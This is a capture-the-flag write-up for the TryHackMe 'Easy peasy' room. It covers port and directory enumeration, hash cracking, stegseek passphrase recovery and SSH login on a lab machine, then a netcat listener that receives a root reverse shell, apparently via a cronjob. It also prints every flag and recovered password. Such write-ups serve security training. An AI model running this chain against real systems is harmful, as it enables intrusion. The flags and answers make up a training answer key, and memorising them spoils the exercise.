---
description: https://tryhackme.com/room/easypeasyctf
---

# Easy peasy CTF

_Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob._

**Task1 Enumeration through Nmap**

<mark style="background-color:purple;">kania0507@fsociety:\~/CTF/TryHackme/Easy Peasy$ sudo nmap -sV -p 80,6498,65524 10.10.17.11</mark>\ <mark style="background-color:purple;">\[sudo] password for kania0507:</mark>\ <mark style="background-color:purple;">Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-28 12:17</mark>&#x20;\ <mark style="background-color:purple;">Nmap scan report for 10.10.17.11</mark>\ <mark style="background-color:purple;">Host is up (0.22s latency).</mark>\ <mark style="background-color:purple;">PORT STATE SERVICE VERSION</mark>\ <mark style="background-color:purple;">80/tcp open http nginx 1.16.1</mark>\ <mark style="background-color:purple;">6498/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</mark>\ <mark style="background-color:purple;">65524/tcp open http Apache httpd 2.4.43 ((Ubuntu))</mark>\ <mark style="background-color:purple;">Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel</mark>\ <mark style="background-color:purple;">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</mark>\ <mark style="background-color:purple;">Nmap done: 1 IP address (1 host up) scanned in 14.98 seconds</mark>

How many ports are open?\
<mark style="background-color:purple;">3</mark>

What is the version of nginx?\
<mark style="background-color:purple;">1.16.1</mark>

What is running on the highest port?\
<mark style="background-color:purple;">apache</mark>



**Task2 Compromising the machine**

```
kania0507@fsociety:~$ gobuster dir -u http://10.10.17.11/ -w ~/Desktop/Wordlist/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.17.11/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kania0507/Desktop/Wordlist/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2025/07/28 12:09:59 Starting gobuster in directory enumeration mode
===============================================================
/hidden               (Status: 301) [Size: 169] [--> http://10.10.17.11/hidden/]
/index.html           (Status: 200) [Size: 612]                                 
/robots.txt           (Status: 200) [Size: 43]                                  
                                                                                
===============================================================
2025/07/28 12:11:59 Finished
===============================================================
```

```
kania0507@fsociety:~/CTF/TryHackme/Easy Peasy$ gobuster dir -u http://10.10.17.11/hidden/ -w ~/Desktop/Wordlist/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.17.11/hidden/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kania0507/Desktop/Wordlist/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2025/07/28 12:11:26 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 390]
/whatever             (Status: 301) [Size: 169] [--> http://10.10.17.11/hidden/whatever/]
```

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

[https://cyberchef.org/](https://cyberchef.org/)

Using GoBuster, find flag 1.\
<mark style="background-color:purple;">flag{f1rs7\_fl4g}</mark>

```
kania0507@fsociety:~$ gobuster dir -u http://10.10.17.11:65524/ -w ~/Desktop/Wordlist/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.17.11:65524/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kania0507/Desktop/Wordlist/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2025/07/28 12:24:53 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 10818]
/robots.txt           (Status: 200) [Size: 153]  
/server-status        (Status: 403) [Size: 279]  
                                                 
===============================================================
2025/07/28 12:26:53 Finished
===============================================================

```

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

Further enumerate the machine, what is flag 2?\
<mark style="background-color:purple;">flag{1m\_s3c0nd\_fl4g}</mark>

<mark style="background-color:purple;">Apache page:</mark>

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Crack the hash with easypeasy.txt, What is the flag 3?\
<mark style="background-color:purple;">flag{9fdafbd64c47471a8f54cd3fc64cd312}</mark>

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

Base62:

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

What is the hidden directory?\
<mark style="background-color:purple;">/n0th1ng3ls3m4tt3r</mark>

<mark style="color:$primary;background-color:purple;">STEGSEEK:</mark>

```
kania0507@fsociety:~/CTF/TryHackme/Easy Peasy$ stegseek -sf binarycodepixabay.jpg -wl easypeasy.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
[i] Found passphrase: "mypasswordforthatjob"
[i] Original filename: "secrettext.txt".
[i] Extracting to "binarycodepixabay.jpg.out".

```

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Using the wordlist that provided to you in this task crack the hash\
what is the password?\
<mark style="background-color:purple;">mypasswordforthatjob</mark>

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

What is the password to login to the machine via SSH?\
<mark style="background-color:purple;">iconvertedmypasswordtobinary</mark><br>

```
kania0507@fsociety:~/CTF/TryHackme/Easy Peasy$ ssh -p 6498 boring@10.10.17.11 
The authenticity of host '[10.10.17.11]:6498 ([10.10.17.11]:6498)' can't be established.
ECDSA key fingerprint is SHA256:hnBqxfTM/MVZzdifMyu9Ww1bCVbnzSpnrdtDQN6zSek.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.17.11]:6498' (ECDSA) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized           **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.17.11's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
boring@kral4-PC:~$ 
```

What is the user flag?\
<mark style="background-color:purple;">flag{n0wits33msn0rm4l}</mark><br>

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

```
kania0507@fsociety:~/CTF/TryHackme/Easy Peasy$ nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.17.11 37856
bash: cannot set terminal process group (17579): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www# id
id
uid=0(root) gid=0(root) groups=0(root)
root@kral4-PC:/var/www# cd /root
cd /root
root@kral4-PC:~# ls -al
ls -al
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root    2 Jun  9 11:25 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
root@kral4-PC:~# cat .root.txt
cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}
root@kral4-PC:~# 
```

What is the root flag?\
<mark style="background-color:purple;">flag{63a9f0ea7bb98050796b649e85481845}</mark>
